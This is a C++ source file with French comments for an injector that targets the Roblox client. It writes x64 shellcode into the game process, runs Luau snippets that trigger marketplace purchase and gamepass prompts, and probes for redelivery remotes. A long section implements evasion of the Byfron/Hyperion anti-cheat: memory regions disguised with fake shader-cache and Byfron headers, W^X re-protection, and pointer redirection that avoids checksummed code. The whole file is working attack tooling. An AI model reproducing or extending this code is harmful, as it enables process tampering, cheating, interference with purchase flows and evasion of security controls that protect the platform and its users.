    0xFF, 0x53, 0x38,                          // call   [rbx+38h]           ; lua_pcall
    0x89, 0x43, 0x28,                          // mov    [rbx+28h], eax      ; pcallStatus
    0x48, 0x83, 0xC4, 0x30,                    // add    rsp, 30h
    0x5B,                                       // pop    rbx
    0xC3,                                       // ret
};

// Alloue : le bloc RW (LuauTrampBlock + nom + marge pour le source futur) et
// le stub EXECUTE_READWRITE en heap. Patch immédiatement les adresses VM
// (fnLoad/fnPcall) et le chunkname dans la cible. Le nom "=executor\0" est
// copié une fois ; le source est ré-écrit à chaque appel (snippet variable).
bool InstallLoadstringTrampoline(HANDLE proc, LuauVM& vm) {
    if (vm.trampolineInstalled) return true;
    if (!proc || !vm.luauLoad || !vm.luaPcall) return false;

    const char* kName = "=executor";
    const size_t nameLen = std::strlen(kName) + 1;
    const size_t kPayloadMax = 256 * 1024;   // taille max du snippet
    const size_t total = sizeof(LuauTrampBlock) + nameLen + kPayloadMax;
    auto* blk = static_cast<uint8_t*>(
        VirtualAllocEx(proc, nullptr, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
    if (!blk) return false;

    LPVOID fn = AllocateAndWriteStub(proc, kLuauTrampFn, sizeof(kLuauTrampFn));
    if (!fn) { VirtualFreeEx(proc, blk, 0, MEM_RELEASE); return false; }

    LuauTrampBlock t{};
    t.L          = vm.state;
    t.name       = reinterpret_cast<uintptr_t>(blk) + sizeof(LuauTrampBlock);
    t.src        = t.name + nameLen;
    t.size       = 0;   // réécrit à chaque exécution
    t.env        = 0;
    t.loadStatus  = -1; // pas encore exécuté
    t.pcallStatus = -1;
    t.fnLoad     = vm.luauLoad;
    t.fnPcall    = vm.luaPcall;

    SIZE_T w = 0;
    WriteProcessMemory(proc, blk, &t, sizeof(t), &w);
    WriteProcessMemory(proc, blk + sizeof(LuauTrampBlock), kName, nameLen, &w);

    vm.trampolineBlock    = reinterpret_cast<uintptr_t>(blk);
    vm.trampolineFn       = reinterpret_cast<uintptr_t>(fn);
    vm.trampolineInstalled = true;
    std::cout << "[loadstring] trampoline heap : fn=0x" << std::hex << vm.trampolineFn
              << ", bloc=0x" << vm.trampolineBlock << std::dec << "\n";
    return true;
}

void FreeLoadstringTrampoline(HANDLE proc, LuauVM& vm) {
    if (!vm.trampolineInstalled) return;
    if (vm.trampolineFn)    { VirtualFreeEx(proc, reinterpret_cast<LPVOID>(vm.trampolineFn),    0, MEM_RELEASE); vm.trampolineFn    = 0; }
    if (vm.trampolineBlock) { VirtualFreeEx(proc, reinterpret_cast<LPVOID>(vm.trampolineBlock), 0, MEM_RELEASE); vm.trampolineBlock = 0; }
    vm.trampolineInstalled = false;
}

// Exécute un snippet Luau via la trampoline heap : ré-écrit le source dans le
// bloc RW partagé, puis lance le stub. Même sémantique que ExecuteLuauSnippet
// mais sans CreateRemoteThread sur un stub dans .text — tout se passe dans le
// heap privé.
bool ExecuteLuauSnippetTrampoline(HANDLE proc, LuauVM& vm, const char* code, size_t codeLen,
                                  int* outLoad = nullptr, int* outPcall = nullptr) {
    if (!proc || !vm.trampolineInstalled) {
        std::cerr << "Trampoline loadstring non installee.\n";
        return false;
    }
    if (codeLen + 1 > 256 * 1024) { std::cerr << "[loadstring] snippet trop long.\n"; return false; }

    uintptr_t srcBase = vm.trampolineBlock + sizeof(LuauTrampBlock) + std::strlen("=executor") + 1;
    SIZE_T w = 0;
    if (!WriteProcessMemory(proc, reinterpret_cast<LPVOID>(srcBase), code, codeLen, &w) ||
        static_cast<size_t>(w) != codeLen)
    { std::cerr << "[loadstring] ecriture du snippet impossible.\n"; return false; }
    WriteProcessMemory(proc, reinterpret_cast<LPVOID>(srcBase + codeLen), "", 1, &w);

    LuauTrampBlock upd{};
    SIZE_T got = 0;
    ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(vm.trampolineBlock), &upd, sizeof(upd), &got);
    upd.size = codeLen;
    upd.loadStatus  = -1;
    upd.pcallStatus = -1;
    WriteProcessMemory(proc, reinterpret_cast<LPVOID>(vm.trampolineBlock), &upd, sizeof(upd), &w);

    HANDLE t = CreateRemoteThread(proc, nullptr, 0,
                                  reinterpret_cast<LPTHREAD_START_ROUTINE>(vm.trampolineFn),
                                  reinterpret_cast<LPVOID>(vm.trampolineBlock), 0, nullptr);
    if (!t) {
        std::cerr << "[loadstring] CreateRemoteThread a echoue : " << GetLastError() << '\n';
        return false;
    }
    bool ok = WaitForSingleObject(t, 15000) == WAIT_OBJECT_0;
    CloseHandle(t);

    LuauTrampBlock r{};
    got = 0;
    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(vm.trampolineBlock), &r, sizeof(r), &got) ||
        got != sizeof(r))
        return false;
    if (outLoad)  *outLoad  = r.loadStatus;
    if (outPcall) *outPcall = r.pcallStatus;
    return ok && r.loadStatus == 0 && r.pcallStatus == 0;
}

// ---------------------------------------------------------------------------
// Stub d'exécution (shellcode x64, lancé par CreateRemoteThread).
// RCX = LuauExecArgs* mappé dans la cible.
//  1) luau_load(L, name, src, size, env)      -> status stocké +0x34
//  2) si status == 0 : lua_pcall(L, 0, -1, 0) -> status stocké +0x38
// Win x64 : args 1-4 en rcx/rdx/r8/r9, 5e arg sur pile, RSP aligné 16.
// ---------------------------------------------------------------------------
struct alignas(8) LuauExecArgs {
    uintptr_t L;           // +0x00 lua_State*
    uintptr_t src;         // +0x08 const char*
    uintptr_t name;        // +0x10 const char* (=executor)
    uintptr_t fnLoad;      // +0x18 luau_load*
    uintptr_t fnPcall;     // +0x20 lua_pcall*
    uintptr_t size;        // +0x28 size_t
    int32_t   env;         // +0x30
    int32_t   loadStatus;  // +0x34 (out)
    int32_t   pcallStatus; // +0x38 (out)
    int32_t   _pad;        // +0x3C
};

static const uint8_t kLuauExecStub[] = {
    0x53,                                       // push   rbx
    0x48, 0x83, 0xEC, 0x30,                    // sub    rsp, 30h
    0x48, 0x89, 0xCB,                          // mov    rbx, rcx            ; pArgs
    0x48, 0x8B, 0x0B,                          // mov    rcx, [rbx]          ; L
    0x48, 0x8B, 0x53, 0x10,                    // mov    rdx, [rbx+10h]      ; chunkname
    0x4C, 0x8B, 0x43, 0x08,                    // mov    r8,  [rbx+08h]      ; source
    0x4C, 0x8B, 0x4B, 0x28,                    // mov    r9,  [rbx+28h]      ; size
    0x8B, 0x43, 0x30,                          // mov    eax, [rbx+30h]      ; env
    0x48, 0x89, 0x44, 0x24, 0x20,              // mov    [rsp+20h], rax      ; 5e arg
    0xFF, 0x53, 0x18,                          // call   [rbx+18h]           ; luau_load
    0x89, 0x43, 0x34,                          // mov    [rbx+34h], eax      ; loadStatus
    0x85, 0xC0,                                // test   eax, eax
    0x75, 0x14,                                // jnz    +0x14 (saute pcall)
    0x48, 0x8B, 0x0B,                          // mov    rcx, [rbx]          ; L
    0x31, 0xD2,                                // xor    edx, edx            ; nargs = 0
    0x41, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF,        // mov    r8d, -1             ; LUA_MULTRET
    0x45, 0x31, 0xC9,                          // xor    r9d, r9d            ; errfunc = 0
    0xFF, 0x53, 0x20,                          // call   [rbx+20h]           ; lua_pcall
    0x89, 0x43, 0x38,                          // mov    [rbx+38h], eax      ; pcallStatus
    0x48, 0x83, 0xC4, 0x30,                    // add    rsp, 30h
    0x5B,                                       // pop    rbx
    0xC3,                                       // ret
};

// Bloc RW distante : [LuauExecArgs | "=executor\0" | code | "\0"].
// Factorisé pour CreateRemoteThread, APC et thread hijacking.
struct alignas(8) ExecBlock {
    uintptr_t base = 0;
    size_t    size = 0;
};

ExecBlock AllocateExecBlock(HANDLE proc, const LuauVM& vm, const char* code, size_t codeLen) {
    ExecBlock out{};
    if (!proc || !vm.state || !vm.luauLoad || !vm.luaPcall) return out;
    const char* kName = "=executor";
    const size_t nameLen = std::strlen(kName) + 1;
    const size_t total = sizeof(LuauExecArgs) + nameLen + codeLen + 1;
    auto* p = static_cast<uint8_t*>(
        AllocRemoteMemory(proc, total, PAGE_READWRITE));
    if (!p) return out;

    LuauExecArgs a{};
    a.L          = vm.state;
    a.name       = reinterpret_cast<uintptr_t>(p) + sizeof(LuauExecArgs);
    a.src        = a.name + nameLen;
    a.fnLoad     = vm.luauLoad;
    a.fnPcall    = vm.luaPcall;
    a.size       = codeLen;
    a.env        = 0;
    a.loadStatus  = -1;   // "pas encore exécuté" -> polling APC
    a.pcallStatus = -1;
    a._pad        = 0;    // réutilisé en flag "done" par le stub hijack (+0x3C)

    if (!WriteRemoteMemory(proc, p, &a, sizeof(a)) ||
        !WriteRemoteMemory(proc, p + sizeof(LuauExecArgs), kName, nameLen) ||
        !WriteRemoteMemory(proc, p + sizeof(LuauExecArgs) + nameLen, code, codeLen) ||
        !WriteRemoteMemory(proc, p + sizeof(LuauExecArgs) + nameLen + codeLen, "", 1)) {
        VirtualFreeEx(proc, p, 0, MEM_RELEASE);
        return out;
    }

    out.base = reinterpret_cast<uintptr_t>(p);
    out.size = total;
    return out;
}

// Lit les statuts du bloc : luau_load/lua_pcall + flag "done" (+0x3C).
bool ReadExecStatus(HANDLE proc, uintptr_t blockBase, int& load, int& pcall, int& done) {
    LuauExecArgs r{};
    SIZE_T got = 0;
    if (!ReadProcessMemory(proc, reinterpret_cast<LPCVOID>(blockBase), &r, sizeof(r), &got) || got != sizeof(r))
        return false;
    load  = r.loadStatus;
    pcall = r.pcallStatus;
    done  = r._pad;
    return true;
}

bool ExecuteLuauSnippet(HANDLE proc, const LuauVM& vm, const char* code, size_t codeLen,
                        int* outLoad = nullptr, int* outPcall = nullptr) {
    if (!proc || !vm.state || !vm.luauLoad || !vm.luaPcall) {
        std::cerr << "ExecuteLuauSnippet : VM incomplet (state=" << std::hex << vm.state
                  << ", load=" << vm.luauLoad << ", pcall=" << vm.luaPcall << std::dec << ").\n";
        return false;
    }
    ExecBlock blk = AllocateExecBlock(proc, vm, code, codeLen);
    if (!blk.base) { std::cerr << "[exec] VirtualAllocEx a echoue\n"; return false; }

    LPVOID stub = AllocateAndWriteStub(proc, kLuauExecStub, sizeof(kLuauExecStub));
    if (!stub) { VirtualFreeEx(proc, reinterpret_cast<LPVOID>(blk.base), 0, MEM_RELEASE); return false; }

    HANDLE t = CreateRemoteThread(proc, nullptr, 0,
                                  reinterpret_cast<LPTHREAD_START_ROUTINE>(stub),
                                  reinterpret_cast<LPVOID>(blk.base), 0, nullptr);
    if (!t) {
        std::cerr << "[exec] CreateRemoteThread a echoue : " << GetLastError() << '\n';
        VirtualFreeEx(proc, stub, 0, MEM_RELEASE);
        VirtualFreeEx(proc, reinterpret_cast<LPVOID>(blk.base), 0, MEM_RELEASE);
        return false;
    }
    bool ok = WaitForSingleObject(t, 15000) == WAIT_OBJECT_0;
    CloseHandle(t);

    int load = -1, pcall = -1, done = 0;
    ReadExecStatus(proc, blk.base, load, pcall, done);

    VirtualFreeEx(proc, stub, 0, MEM_RELEASE);
    VirtualFreeEx(proc, reinterpret_cast<LPVOID>(blk.base), 0, MEM_RELEASE);
    if (outLoad)  *outLoad  = load;
    if (outPcall) *outPcall = pcall;
    return ok && load == 0 && pcall == 0;
}

void PrintLuauVMInfo(const LuauVM& vm) {
    std::cout << "\n--- VM Luau ---\n";
    std::cout << "  lua_state : 0x" << std::hex << vm.state
              << "  luau_load : 0x" << vm.luauLoad
              << "  lua_pcall : 0x" << vm.luaPcall << std::dec
              << "  [loadstring : " << (vm.trampolineInstalled
                     ? (vm.loadstringEnabled ? "ACTIF (trampoline heap)" : "desactive (trampoline)")
                     : (vm.hookInstalled
                          ? (vm.loadstringEnabled ? "ACTIF (hook legacy)" : "desactive (hook legacy)")
                          : "absent")) << "]\n";
}

// Snippet de démonstration : utilise les API NATIVES du vrai environnement
// (game:GetService, task.wait…) une fois le lua_State atteint.
static const char* kSnippetDefault =
    "print('VM Luau : point d\\'entree execute')\n"
    "local ok = type(game) == 'userdata'\n"
    "print('environnement Roblox:', ok)\n"
    "if ok then\n"
    "  local ms = game:GetService('MarketplaceService')\n"
    "  print('MarketplaceService:', ms ~= nil)\n"
    "end\n"
    "task.wait(0.1)\n";

static const char* kSnippetMarketplace =
    "local MarketplaceService = game:GetService('MarketplaceService')\n"
    "local Players = game:GetService('Players')\n"
    "local localPlayer = Players.LocalPlayer\n"
    "\n"
    "local assetId = 1611820378\n"
    "\n"
    "local purchaseOptions = {\n"
    "    Metadata = {\n"
    "        ['source'] = 'injecteur',\n"
    "        ['note'] = 'demo',\n"
    "    },\n"
    "    PurchaseType = Enum.PurchaseType.Robux,\n"
    "}\n"
    "\n"
    "local function promptLegacy()\n"
    "    local connection\n"
    "    connection = MarketplaceService.PromptPurchaseFinished:Connect(function(player, didPurchase, id, receipt)\n"
    "        if player == localPlayer and id == assetId then\n"
    "            print('[achat] termine, reussi =', didPurchase, 'receipt =', receipt)\n"
    "            connection:Disconnect()\n"
    "            if didPurchase then\n"
    "                print('[achat] PRODUIT OFFERT -- attente du serveur pour ProcessReceipt')\n"
    "            end\n"
    "        end\n"
    "    end)\n"
    "\n"
    "    local ok, err = pcall(function()\n"
    "        MarketplaceService:PromptProductPurchase(localPlayer, assetId)\n"
    "    end)\n"
    "    if not ok then print('[achat] PromptProductPurchase KO :', err) end\n"
    "end\n"
    "\n"
    "local function promptNew()\n"
    "    local prompter = MarketplaceService:PromptPurchase(localPlayer, assetId, purchaseOptions)\n"
    "\n"
    "    prompter.Started:Connect(function()\n"
    "        print('[achat] fenetre ouverte')\n"
    "    end)\n"
    "\n"
    "    prompter.ReadyForUse:Connect(function()\n"
    "        print('[achat] fenetre prete pour l\\'achat')\n"
    "    end)\n"
    "\n"
    "    prompter.OutOfStock:Connect(function()\n"
    "        print('[achat] RUPTURE DE STOCK : l\\'achat ne peut pas continuer')\n"
    "    end)\n"
    "\n"
    "    prompter.PurchaseFinished:Connect(function(receiptData)\n"
    "        print('[achat] PurchaseFinished, data =', receiptData)\n"
    "    end)\n"
    "\n"
    "    prompter.Finished:Connect(function(receiptData)\n"
    "        print('[achat] prompter ferme, data =', receiptData)\n"
    "    end)\n"
    "end\n"
    "\n"
    "task.wait(0.5)\n"
    "\n"
    "local okNew, errNew = pcall(function() promptNew() end)\n"
    "if not okNew then\n"
    "    print('[achat] PromptPurchase indisponible, fallback legacy :', errNew)\n"
    "    promptLegacy()\n"
    "end\n";

static const char* kSnippetGamepass =
    "local MarketplaceService = game:GetService('MarketplaceService')\n"
    "local Players = game:GetService('Players')\n"
    "local localPlayer = Players.LocalPlayer\n"
    "\n"
    "local gamepassId = 6738811\n"
    "\n"
    "local connection\n"
    "connection = MarketplaceService.PromptGamePassPurchaseFinished:Connect(function(player, didPurchase, id, receipt)\n"
    "    if player == localPlayer and id == gamepassId then\n"
    "        print('[gamepass] fini, reussi =', didPurchase, 'receipt =', receipt)\n"
    "        connection:Disconnect()\n"
    "    end\n"
    "end)\n"
    "\n"
    "local okNew, err = pcall(function()\n"
    "    local prompter = MarketplaceService:PromptPurchase(localPlayer, gamepassId, {\n"
    "        PurchaseType = Enum.PurchaseType.Robux,\n"
    "    })\n"
    "    prompter.PurchaseFinished:Connect(function(data) print('[gamepass][new] receipt =', data) end)\n"
    "    prompter.Finished:Connect(function() print('[gamepass][new] prompter ferme') end)\n"
    "end)\n"
    "\n"
    "if not okNew then\n"
    "    print('[gamepass] PromptPurchase KO, fallback legacy :', err)\n"
    "    MarketplaceService:PromptGamePassPurchase(localPlayer, gamepassId)\n"
    "end\n";

static const char* kSnippetDevProduct =
    "local MarketplaceService = game:GetService('MarketplaceService')\n"
    "local Players = game:GetService('Players')\n"
    "local localPlayer = Players.LocalPlayer\n"
    "\n"
    "local productId = 1488973110\n"
    "\n"
    "MarketplaceService:GetProductInfo(productId, Enum.InfoType.Product):andThen(function(info)\n"
    "    print('[devproduct] ' .. info.Name .. ' - ' .. tostring(info.RobuxPrice) .. ' R$')\n"
    "end, function(err)\n"
    "    print('[devproduct] info introuvable :', err)\n"
    "end)\n"
    "\n"
    "local connection\n"
    "connection = MarketplaceService.PromptPurchaseFinished:Connect(function(player, didPurchase, id, receipt)\n"
    "    if player == localPlayer and id == productId then\n"
    "        print('[devproduct] fini, reussi =', didPurchase, 'receipt =', receipt)\n"
    "        connection:Disconnect()\n"
    "    end\n"
    "end)\n"
    "\n"
    "local okNew, err = pcall(function()\n"
    "    local prompter = MarketplaceService:PromptPurchase(localPlayer, productId, {\n"
    "        PurchaseType = Enum.PurchaseType.Robux,\n"
    "    })\n"
    "    prompter.PurchaseFinished:Connect(function(data) print('[devproduct][new] receipt =', data) end)\n"
    "    prompter.Finished:Connect(function() print('[devproduct][new] prompter ferme') end)\n"
    "end)\n"
    "\n"
    "if not okNew then\n"
    "    print('[devproduct] PromptPurchase KO, fallback legacy :', err)\n"
    "    MarketplaceService:PromptProductPurchase(localPlayer, productId)\n"
    "end\n";

static const char* kSnippetDetect =
    "local MarketplaceService = game:GetService('MarketplaceService')\n"
    "local Players = game:GetService('Players')\n"
    "local localPlayer = Players.LocalPlayer\n"
    "\n"
    "local gamepassId = 1611820378\n"
    "local productId  = 1488973110\n"
    "\n"
    "local okOwn, owned = pcall(function()\n"
    "    return MarketplaceService:UserOwnsGamePassAsync(localPlayer.UserId, gamepassId)\n"
    "end)\n"
    "print('[detect] gamepass possede =', okOwn and owned or '???')\n"
    "\n"
    "local InventoryService = game:GetService('InventoryService')\n"
    "local okDesc, items = pcall(function()\n"
    "    return InventoryService:GetInventory(localPlayer, Enum.ItemType.Purchase)\n"
    "end)\n"
    "if okDesc then\n"
    "    for _, entry in pairs(items) do\n"
    "        local key = tostring(entry.Key)\n"
    "        print('[detect] inventaire :', entry.ItemType, key)\n"
    "    end\n"
    "end\n"
    "\n"
    "local fireSignal = pcall(function()\n"
    "    local Remote = workspace:WaitForChild('PurchaseEvents', 3)\n"
    "    if Remote then\n"
    "        print('[detect] remote de repurchase trouve :', Remote:GetFullName())\n"
    "    end\n"
    "end)\n"
    "if not fireSignal then print('[detect] aucun remote de redelivery expose.') end\n";

int RunLuauVMDemo(const std::vector<const char*>& positional, bool wantLoadstringHook, const char* snippetOverride = nullptr) {
    std::cout << "=== Point d'entree VM Luau ===\n\n";

    if (!IsProcessElevated()) {
        std::cerr << "Elevation UAC requise (processus Roblox protege).\n";
        return 1;
    }
    if (!EnableDebugPrivilege())
        std::cerr << "Avertissement : SeDebugPrivilege indisponible.\n";

    DWORD pid = 0;
    std::string snippet;
    uintptr_t overLoad = 0, overPcall = 0, overState = 0;
    size_t addrKind = 0;
    for (size_t i = 0; i < positional.size(); ++i) {
        std::string_view a = positional[i];
        if (i == 0) {
            if (auto p = ResolveTargetPid(a)) pid = *p;
            else { std::cerr << "Cible invalide : " << a << '\n'; return 1; }
        } else if (a.size() > 2 && a[0] == '0' && (a[1] == 'x' || a[1] == 'X')) {
            unsigned long long v = std::strtoull(positional[i], nullptr, 16);
            if (addrKind == 0)     overLoad  = static_cast<uintptr_t>(v);
            else if (addrKind == 1) overPcall = static_cast<uintptr_t>(v);
            else overState = static_cast<uintptr_t>(v);
            ++addrKind;
        } else if (snippet.empty()) {
            snippet = positional[i];
        }
    }
    if (!pid) { std::cerr << "Aucune cible. Usage : aob.exe --luau-vm <pid|exe>\n"; return 1; }
    if (snippetOverride && snippet.empty()) snippet = snippetOverride;
    if (snippet.empty()) snippet = kSnippetDefault;

    UniqueHandle proc = OpenTargetProcess(pid);
    if (!proc) return 1;

    auto mods = EnumModules(pid);
    const ModuleInfo* mod = ChooseRobloxModule(mods);
    if (!mod) {
        std::cerr << "Module Roblox introuvable (RobloxPlayerBeta.dll / RobloxStudioBeta.exe).\n";
        return 1;
    }
    std::cout << "Module : 0x" << std::hex << mod->base << "  (" << std::dec << mod->size << " octets)\n";

    LuauVM vm;
    if (overLoad) vm.luauLoad = overLoad;
    else ResolveLuauFunctionAny(proc.get(), *mod, SigStore::LuauLoad(), vm.luauLoad, "luau_load");
    if (overPcall) vm.luaPcall = overPcall;
    else {
        if (!ResolveLuauFunctionAny(proc.get(), *mod, LuauEscapeSigs::kLuaPcall, vm.luaPcall, "lua_pcall"))
            ResolveLuauFunctionAny(proc.get(), *mod, LuauEscapeSigs::kRbxPcall, vm.luaPcall, "rbx_pcall");
    }
    if (!vm.luauLoad || !vm.luaPcall) {
        std::cerr << "Resolution VM incomplete (luau_load 0x" << std::hex << vm.luauLoad
                  << ", lua_pcall 0x" << vm.luaPcall << std::dec << ").\n"
                  << "  -> fournis les adresses en hexa apres la cible, ou mets a jour les signatures.\n";
        return 1;
    }

    if (overState) vm.state = overState;
    else {
        std::cout << "[state] recherche d'un lua_State dans les piles des threads scripts...\n";
        vm.state = FindLuaStateFromScriptThreads(pid);
        if (!vm.state) vm.state = FindLuaStateInModule(proc.get(), *mod);
        if (!vm.state) vm.state = FindLuaStateInDataModel(proc.get(), *mod);
    }

    PrintLuauVMInfo(vm);

    bool okTramp = false;
    if (wantLoadstringHook) {
        okTramp = InstallLoadstringTrampoline(proc.get(), vm);
        if (okTramp) SetLoadstringEnabled(vm, true);
        else std::cerr << "Trampoline loadstring non installee.\n";
    }

    if (vm.state && vm.luauLoad && vm.luaPcall) {
        int load = -1, pcall = -1;
        std::cout << "\n-- execution du snippet --\n" << snippet << "-- fin --\n";
        bool okRun = ExecuteLuauSnippet(proc.get(), vm, snippet.c_str(), snippet.size(), &load, &pcall);
        std::cout << "luau_load => " << load << ", lua_pcall => " << pcall
                  << "  (" << (okRun ? "SUCCES" : "ECHEC") << ")\n";
        if (!okRun && load == -1 && pcall == -1)
            std::cout << "  -> le stub n'a jamais ecrit son statut : soit la fonction resolue\n"
                      << "     n'est pas luau_load (build du jeu changee ? mauvais candidat ?),\n"
                      << "     soit le thread distant a ete bloque/neutralise par Byfron.\n"
                      << "     Verifie avec --sig-update (nouvelle build) ou essaie --apc/--hijack.\n";
    } else {
        std::cerr << "lua_State non resolu : mode scan pur (adresses uniquement).\n";
    }

    if (okTramp) {
        std::cout << "\n[loadstring] liberation de la trampoline...\n";
        FreeLoadstringTrampoline(proc.get(), vm);
    }
    return 0;
}
// ===========================================================================
// Survie anti-cheat pendant la fenêtre (Byfron / Hyperion) — ÉVASION & PROTECTION
// ---------------------------------------------------------------------------
// Pendant l'exécution d'un prompt (ex : PromptProductPurchase), le compte doit
// rester EN JEU jusqu'à la fin. Règles (feature 4) :
//   1) STUB EN MEMOIRE HEAP : allocation privée (MEM_PRIVATE, VirtualAllocEx),
//      JAMAIS une page d'image existante → aucun patch de .text (le .text d'un
//      module est vérifié par checksums AC ; un pointeur DATA, lui, ne l'est pas).
//   2) PROTECTION W^X : le stub est écrit en PAGE_READWRITE puis re-protégé en
//      PAGE_EXECUTE_READ (RX) au repos — jamais RWX exposé (« mémoire
//      modifiable » = flag EDR). Re-heal chaque tick ré-applique RX.
//   3) TAGS / FRONTS DE MÉMOIRE : la région est préfixée d'un « front » qui
//      imite une allocation légitime (header « connu Byfron » OU lookalike
//      DXBC = cache de shaders). Pas d'API pour nommer les sections d'une
//      VirtualAlloc → on mime le contenu, octet par octet.
//   4) VMT / REDIRECTION DE POINTEURS : pour tout hook éventuel, il ne faut
//      JAMAIS écrire dans le code du jeu : on redirige un slot de pointeur
//      (vtable, fonction stockée, global) vers notre zone heap
//      (InstallPtrRedirect). Outillage + démo vérifiable : --vmt-demo.
//   5) PAS DE CALLBACK RESEAU INJECTÉ : aucun import ws2_32/wininet/winhttp
//      dans le stub ; tout passe par le thread local + luau_load/lua_pcall.
// Le snippet est exécuté AU TRAVERS du stub heap (ExecuteLuauSnippet) — aucun
// hook inline sur le .text du module, aucun résidu : libération totale en fin.
// ===========================================================================

// ---------------------------------------------------------------------------
// « FRONTS » DE MÉMOIRE — tags qui imitent des allocations légitimes (évasion
// des scans AC qui cherchent des blocs « inhabituels »). Windows ne permet pas
// de nommer les sections d'une VirtualAlloc (aucune API), donc on MIME le
// contenu en tête de région : le scan voit un bloc préfixé qui ressemble à un
// vrai objet du système (heap connu Byfron ou cache de shaders DXBC).
// ---------------------------------------------------------------------------
namespace MemTag {
    enum class Kind {
        Byfron,          // header « connu Byfron » (à recaler sur le build cible)
        ShaderCache,     // lookalike « cache DXBC » (zone rendu du moteur)
    };

    constexpr size_t kAlign = 0x10;

    inline size_t ByfronSize() { return 0x10; }
    inline size_t ShaderSize() { return 0x40; }
    inline size_t TagSize(Kind k) { return k == Kind::Byfron ? ByfronSize() : ShaderSize(); }

    // Header « connu Byfron ». ATTENTION : le magic exact change à chaque build ;
    // capture le header d'une vraie allocation avec --survivor <pid> puis
    // duplique-le ci-dessous. Structure vue en reverse : 0x10 octets
    // (magic + taille + type + réservé) puis le payload.
    inline void WriteByfron(uint8_t* h, size_t payloadSize) {
        static const uint8_t kHeader[0x10] = {
            0x4B, 0x42, 0x02, 0x10,     // 'KB' + version de tag (placeholder)
            0x00, 0x00, 0x00, 0x00,     // taille du payload (patchée)
            0x00, 0x00, 0x00, 0x00,     // type : alloué (patché si besoin)
            0x00, 0x00, 0x00, 0x00,     // réservé
        };
        std::memcpy(h, kHeader, sizeof(kHeader));
        std::memcpy(h + 4, &payloadSize, sizeof(size_t));
    }

    // Lookalide « cache de shaders » (DXBC = blob d'un shader D3D compilé) :
    // magic 'DXBC', checksum, taille totale, count, puis une table de chunks
    // (RDEF/ISGN/OSGN) comme un vrai blob — 0x40 octets de « front » avant le
    // payload. Aucun octet de ce front ne ressemble à du code.
    inline void WriteShaderCache(uint8_t* h, size_t payloadSize) {
        std::memset(h, 0, ShaderSize());
        static const uint8_t kDxbc[4] = { 'D', 'X', 'B', 'C' };
        std::memcpy(h, kDxbc, 4);
        uint32_t v = 1;
        std::memcpy(h + 0x08, &v, 4);                                   // 'one' hérité DXBC
        v = static_cast<uint32_t>(ShaderSize() + payloadSize);
        std::memcpy(h + 0x0C, &v, 4);                                   // taille totale
        v = 3;
        std::memcpy(h + 0x10, &v, 4);                                   // nb de chunks
        auto putChunk = [&](size_t idx, uint32_t off, const char* fcc) {
            uint8_t* p = h + 0x14 + idx * 12;
            const uint32_t sz = 0x18 + static_cast<uint32_t>(idx) * 0x08;
            std::memcpy(p, &off, 4);                                    // offset
            std::memcpy(p + 4, &sz, 4);                                 // taille plausible
            for (int k = 0; k < 4; ++k) p[8 + k] = static_cast<uint8_t>(fcc[k]);
        };
        putChunk(0, 0x40u, "RDEF");
        putChunk(1, 0x60u, "ISGN");
        putChunk(2, 0x88u, "OSGN");
    }
}

// TRUE si `addr` appartient à une allocation PRIVÉE engagée (heap injecté).
inline bool IsPrivateAllocation(HANDLE proc, uintptr_t addr) {
    MEMORY_BASIC_INFORMATION mbi{};
    if (VirtualQueryEx(proc, reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) != sizeof(mbi)) return false;
    return mbi.State == MEM_COMMIT && mbi.Type == MEM_PRIVATE;
}

// TRUE si `addr` tombe dans une image mappée (page .text d'un module existant)
// — en survie on refuse TOUT patch de ce type.
inline bool IsImageAllocation(HANDLE proc, uintptr_t addr) {
    MEMORY_BASIC_INFORMATION mbi{};
    if (VirtualQueryEx(proc, reinterpret_cast<LPCVOID>(addr), &mbi, sizeof(mbi)) != sizeof(mbi)) return true;
    return mbi.State == MEM_COMMIT && mbi.Type == MEM_IMAGE && IsReadableRegion(mbi);
}

inline bool IsProcessAlive(HANDLE proc) {
    return WaitForSingleObject(proc, 0) == WAIT_TIMEOUT;
}

struct TaggedStub {
    uintptr_t regionBase = 0;      // base de l'allocation (header taggé devant)
    uintptr_t payload    = 0;      // octets de code exécutables (décalés du header)
    size_t    size       = 0;      // taille du payload
    DWORD     protect    = 0;      // protection appliquée (PAGE_EXECUTE_READWRITE)
};

// Modes de protection finale du stub :
//   WriteOnce   -> W^X : écriture faite en RW puis re-protection RX. Aucun bit
//                  « modifiable » exposé au repos (evasion feature 4).
//   WriteExecute-> RWX final (hérité) : flag « mémoire modifiable » visible.
enum class StubProtectMode {
    WriteExecute,
    WriteOnce,
};

// Alloue un stub en heap privé, préfixé d'un « front » de mémoire légitime
// (tag imitant une zone connue : Byfron ou cache DXBC), écrit en RW (W^X
// strict : on n'écrit JAMAIS dans une page déjà exécutable), puis re-protège
// la région selon le mode. Échec => out.zeros.
TaggedStub AllocateTaggedStub(HANDLE proc, const void* pStub, size_t stubSize,
                              MemTag::Kind tag = MemTag::Kind::ShaderCache,
                              StubProtectMode mode = StubProtectMode::WriteOnce) {
    TaggedStub out{};
    if (!proc || !pStub || stubSize == 0) return out;

    const size_t payloadOff = (MemTag::TagSize(tag) + MemTag::kAlign - 1) & ~(MemTag::kAlign - 1);
    const size_t total = payloadOff + stubSize;

    // Allocation MEM_PRIVATE en RW — jamais RWX pendant l'écriture (W^X).
    LPVOID base = VirtualAllocEx(proc, nullptr, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!base) return out;

    // « front » légitime devant le payload (tag imitant une zone reconnue de l'AC)
    std::vector<uint8_t> front(payloadOff);
    if (tag == MemTag::Kind::Byfron) MemTag::WriteByfron(front.data(), stubSize);
    else                             MemTag::WriteShaderCache(front.data(), stubSize);
    SIZE_T w = 0;
    if (!WriteProcessMemory(proc, base, front.data(), front.size(), &w) || w != front.size()) {
        VirtualFreeEx(proc, base, 0, MEM_RELEASE);
        return out;
    }

    // payload (juste après le front, aligné 16)
    auto* payloadPtr = reinterpret_cast<uint8_t*>(base) + payloadOff;
    if (!WriteProcessMemory(proc, payloadPtr, pStub, stubSize, &w) || w != stubSize) {
        VirtualFreeEx(proc, base, 0, MEM_RELEASE);
        return out;
    }

    // Re-protection W^X : WriteOnce -> PAGE_EXECUTE_READ (aucun « modifiable »
    // au repos) ; WriteExecute -> PAGE_EXECUTE_READWRITE (mode debug/historique).
